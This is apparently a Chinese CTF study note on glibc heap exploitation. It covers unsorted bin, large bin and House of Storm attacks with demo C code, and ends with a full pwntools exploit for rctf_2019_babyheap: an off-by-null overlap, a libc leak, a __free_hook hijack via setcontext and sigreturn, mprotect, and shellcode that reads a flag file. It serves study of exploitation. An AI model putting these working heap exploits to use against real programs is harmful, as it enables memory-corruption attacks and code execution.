---
title: House of strom和它的前生今世
tags:
  - binary
---

# House of strom和它的前生今世

## unsorted bin attack

how2heap源代码：

```c
#include <stdio.h>
#include <stdlib.h>

int main(){

	unsigned long stack_var=0;

	unsigned long *p=malloc(400); // 弄出一个unsorted bin来

	malloc(500); // 隔开top chunk

	free(p); // p进unsorted bin

	//------------VULNERABILITY-----------

	p[1]=(unsigned long)(&stack_var-2); 修改bk指向fuck_add-0x10处

	//------------------------------------

	malloc(400); // 取出chunk，实现攻击
}
```

Q&A：
1. Q:unsorted bin attack利用条件是什么？  A:能够控制unsorted bin chunk的bk。
2. Q:unsorted bin attack能造成什么样的结果？  A:任意地址写入一个libc地址。
3. Q:unsorted bin attack的原理是什么？

A:_int_malloc中有一段代码：

```c
/* remove from unsorted list */
 if (__glibc_unlikely (bck->fd != victim)) 
    malloc_printerr ("malloc(): corrupted unsorted chunks 3"); 
unsorted_chunks (av)->bk = bck; 
bck->fd = unsorted_chunks (av);
```

从unsorted list取出chunk时bck->fd变为取出的unsorted bin位置，如果控制了bk我们就能实现任意地址写入一个unsorted_chunks(av)。

## large bin attack

how2heap源码：

```c
#include<stdio.h>
#include<stdlib.h>
 
int main()
{
   
    unsigned long stack_var1 = 0;  //fuck_add1
    unsigned long stack_var2 = 0;  //fuck_add2

    unsigned long *p1 = malloc(0x320); // chunk1,在small bin范围
    malloc(0x20);  //例行隔开，后面也是

    unsigned long *p2 = malloc(0x400); // chunk2,在large bin范围
    malloc(0x20);

    unsigned long *p3 = malloc(0x400); //chunk3
    malloc(0x20);
 
    free(p1);
    free(p2); //unsorted bin 进入两个chunk
    
   malloc(0x90);  // 切割chunk1，取出0x90的chunk，chunk2进large bin

    free(p3); //chunk3进unsorted bin
 
    //------------VULNERABILITY-----------

    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2); // bk
    p2[3] = (unsigned long)(&stack_var2 - 4);  //bk_nextsize

    //------------------------------------

    malloc(0x90); // 触发large bin attack
 
    return 0;
}

```

其中有注释：

```c
/*

    This technique is taken from
    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/

    [...]

              else
              {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim;
              }
              bck = fwd->bk;

    [...]

    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;

    For more details on how large-bins are handled and sorted by ptmalloc,
    please check the Background section in the aforementioned link.

    [...]

 */

```

在large bin中，fd_nextsize和bk_nextsize就要启用了。

large bin是双循环链表,对于同样大小的free chunk我们所释放的第一个chunk会成为一个堆头,其bk_nextsize指向下一个比他大的堆头,而fd_nextsize指向下一个比他小的堆头,然后最大的堆头的bk_nextsize指向最小的堆头,最小的堆头的fd_nextsize指向最大的堆头,而剩下的free chunk就会通过fd和bk指针链在堆头的下面,他们的fd_nextsize和bk_nextsize的值都为0

形状的话就像是多个chunk按大小(从大到小)围成一个圆(最大最小相接),而每一个chunk的后面都链着一排和他一样大小的chunk

large bin attack利用条件是可以控制large bin的bk和bk_nextsize。结果是进行两个地址的写。
利用原理是

```c
victim->bk_nextsize = fwd->bk_nextsize;

bck = fwd->bk;
victim->bk = bck;

```

## house of strom

### house of strom的原理

几乎等于 unsorted bin attack + large bin attack。

用 unsorted bin attack 将fake_chunk入链，用large bin attack伪造fake chunk size，实现任意地址分配chunk。

```c
// compiled: gcc -g -fPIC -pie House_of_Strom.c -o House_of_Strom
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct {
    char padding[0x10]; // NULL padding
    char sh[0x10];
}global_container = {"","id"};

int main()
{
    char *unsorted_bin, *large_bin, *fake_chunk, *ptr;

    unsorted_bin = malloc(0x4e8); // size 0x4f0
    // 防止合并
    malloc(0x18);
    large_bin = malloc(0x4d8); // size 0x4e0
    // 防止合并
    malloc(0x18);

    // FIFO
    free(large_bin); // 先放小的chunk
    free(unsorted_bin);

    // large_bin 归位
    unsorted_bin = malloc(0x4e8);
    // unsorted_bin 归位
    free(unsorted_bin);

    fake_chunk = global_container.sh - 0x10;

    ((size_t *)unsorted_bin)[0] = 0; // unsorted_bin->fd
    ((size_t *)unsorted_bin)[1] = (size_t)fake_chunk; // unsorted_bin->bk

    ((size_t *)large_bin)[0] = 0; // large_bin->fd
    // 用于创建假块的“bk”，以避免从未排序的bin解链接时崩溃
    ((size_t *)large_bin)[1] = (size_t)fake_chunk + 8; // large_bin->fd
    ((size_t *)large_bin)[2] = 0; // large_bin->fd_nextsize
    // 用于使用错误对齐技巧创建假块的“大小”
    ((size_t *)large_bin)[3] = (size_t)fake_chunk - 0x18 - 5; // large_bin->bk_nextsize

    ptr = malloc(0x48);
    strncpy(ptr, "/bin/sh", 0x48 - 1);
    system(global_container.sh);

    return 0;
}
摘自Ex：https://xz.aliyun.com/t/5265#toc-3
```

`((size_t *)large_bin)[3] = (size_t)fake_chunk - 0x18 - 5; `，这条语句是为了错位将0x55写入fake_chunk-0x18，从而使malloc(0x48)可以成功申请到fake_chunk位置，成功几率为1/3。(开启PIE)

如果程序没有开启PIE，size可能为0x610000-0x25d0000，那就得在bk_nextsize填入fake_chunk-0x18-2，之后malloc(0x48)，成功几率为1/32。

## rctf_2019_babyheap

这个题目edit函数里面有一个off-by-null漏洞:

```c
__int64 __fastcall read_n(void *a1, unsigned int a2)
{
  unsigned int v3; // [rsp+14h] [rbp-Ch]

  v3 = read(0, a1, a2);
  if ( (v3 & 0x80000000) != 0 )
  {
    puts("read() error");
    exit(0);
  }
  if ( v3 && *(a1 + v3 - 1) == 10 )
    *(a1 + v3 - 1) = 0;
  return v3;
}
```

利用off-by-null造堆块重叠，一个进unsorted bin，另一个进large bin，然后house of strom，再进行后续操作。

开了沙箱，贼难操作。

**泄露出libc基址**

```python
add(0x80)#0
add(0x68)#1
add(0xf8)#2
add(0x18)#3

free(0)
edit(1,'a'*0x60+p64(0x100))
free(2)
add(0x80)#0
add(0x80)#2
free(2)
show(1)
libc_base = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 0x3c4b78
log.info(hex(libc_base))
system = libc_base + libc.sym['system']

add(0x160)#2
```

456为一组造一个unsorted bin，789为一组造一个large bin。

```python
add(0x18)#4
add(0x508)#5
add(0x18)#6
add(0x18)#7
add(0x508)#8
add(0x18)#9
add(0x18)#10
```

之后创造出house of strom的条件来。

```python
edit(5,'a'*0x4f0+p64(0x500))
free(5)
edit(4,'a'*0x18)
add(0x18)#5
add(0x4d8)#11
free(5)
free(6)
add(0x30)#5
add(0x4e8)#6

edit(8,'a'*0x4f0+p64(0x500))
free(8)
edit(7,'a'*0x18)
add(0x18)#8
add(0x4d8)#12
free(8)
free(9)
add(0x40)#8

free(6)
add(0x4e8)#6
free(6)
```

这样就造成了6和11重叠，8和12重叠。

```python
free_hook = libc_base + libc.sym['__free_hook']
fake_chunk = free_hook - 0x20
payload = 'a'*0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)
edit(11,payload)
payload = 'a'*0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)
edit(12,payload)
add(0x48)#6
```

`add(0x48)#6`成功率1/3。由于开了沙箱，下面的操作及其困难，以至于搞了三天才看懂。

```python
new_execve = free_hook & 0xfffffffffffff000
shellcode1 = '''
mov rdi, 0
mov rsi, %d
mov edx, 0x1000

mov eax, 0
syscall

jmp rsi
''' % new_execve
payload = 'a'*0x10+p64(libc_base+libc.sym['setcontext']+53) + p64(free_hook+0x10) + asm(shellcode1)
edit(6,payload)
context.arch='amd64'
frame = SigreturnFrame()
frame.rsp = free_hook + 8
frame.rip = libc_base + libc.sym['mprotect']
frame.rdi = new_execve
frame.rsi = 0x1000
frame.rdx = 4 | 2 | 1
edit(12,str(frame))
free(12)
shellcode2 = '''
mov rax, 0x67616c662f2e ;// ./flag
push rax

mov rdi, rsp ;// ./flag
mov rsi, 0 ;// O_RDONLY
mov rdx, 0 ;//
mov rax, 2 ;// SYS_open
syscall

mov rdi, rax ;// fd 
mov rsi,rsp  ;// 
mov rdx, 1024 ;// nbytes
mov rax,0 ;// SYS_read
syscall

mov rdi, 1 ;// fd 
mov rsi, rsp ;// buf
mov rdx, rax ;// count 
mov rax, 1 ;// SYS_write
syscall

mov rdi, 0 ;// error_code
mov rax, 60
syscall
'''
io.interactive()
io.send(asm(shellcode2))
print io.recv()
io.interactive()
```

改__free_hook为setcontext，写个sigreturn放进chunk里free他就可以执行mprotect和read，把orw写进去就行了。

## 总结

House of strom利用需要对unsorted bin和large bin的控制，有一定的几率可以实现任意地址的一个分配，危害比较大。